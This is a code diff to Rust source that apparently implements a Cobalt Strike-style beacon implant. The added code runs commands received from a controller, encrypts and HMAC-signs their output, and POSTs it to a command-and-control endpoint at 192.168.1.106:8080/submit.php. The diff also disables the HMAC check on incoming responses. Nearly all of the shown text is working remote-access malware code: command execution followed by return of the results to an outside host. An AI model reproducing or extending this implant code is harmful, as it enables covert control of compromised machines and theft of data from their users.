@@ -1,3 +1,4 @@
+// use core::slice::SlicePattern;
 /// b1tg @ 2022/11/19
 use std::{
     cell::Cell,
@@ -5,11 +6,13 @@ use std::{
     fs,
     io::{BufReader, Read},
     net::{Ipv4Addr, SocketAddr, SocketAddrV4},
+    os::raw,
     process::Command,
     vec,
 };
-
+// use sha2::Sha256;
 use bytes::{BufMut, BytesMut};
+use hmac::{Hmac, Mac};
 use rsa::{pkcs8::DecodePublicKey, PaddingScheme, PublicKey, RsaPrivateKey, RsaPublicKey};
 use sha2::{Digest, Sha256, Sha512};
 // use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
@@ -164,7 +167,7 @@ fn main() {
             if content_length > 0 {
                 println!("get response with size={}", content_length);
                 let content = res.bytes().unwrap();
-                let hmac_hash = &content[content_length - 16..];
+                // let hmac_hash = &content[content_length - 16..];
                 let rest_bytes = &content[..content_length - 16];
                 let iv = b"abcdefghijklmnop";
                 let decrypted = aes_decrypt(rest_bytes, &beacon.aes_key, iv).unwrap();
@@ -193,7 +196,35 @@ fn main() {
                     let args = args.replace("/C", "");
                     let args = args.trim();
                     let output = os_system(&args).unwrap();
+                    let iv = b"abcdefghijklmnop";
+                    let counter = 1u32;
+                    let reply_type = 0u32;
+                    let raw_pkg = [
+                        &counter.to_be_bytes()[..],
+                        &(output.len() + 4).to_be_bytes()[..],
+                        &reply_type.to_be_bytes()[..],
+                        &output.as_bytes(),
+                    ]
+                    .concat();
+                    let raw_pkg_encrypted =
+                        aes_encrypt(&raw_pkg.as_slice(), &beacon.aes_key, iv).unwrap();
+                    let hash = hmac_hash(raw_pkg_encrypted.as_slice());
+                    let buf = [
+                        &(raw_pkg_encrypted.len() + 16).to_be_bytes()[..],
+                        raw_pkg_encrypted.as_slice(),
+                        &hash[..],
+                    ]
+                    .concat();
                     println!("output: {}", output);
+                    println!(
+                        "raw_pkg, len:{}, data:{:?}",
+                        raw_pkg.len(),
+                        hexdump::hexdump(&raw_pkg)
+                    );
+                    println!("buf, len:{}, data:{:?}", buf.len(), hexdump::hexdump(&buf));
+                    let url = format!("http://192.168.1.106:8080/submit.php?id={}", beacon.id);
+                    let post_res = Strike::http_post(&url, "", "", buf);
+                    dbg!(post_res);
                 } else {
                     println!("UNKNOW: cmd_content: {:?}", "&cmd_content");
                 }
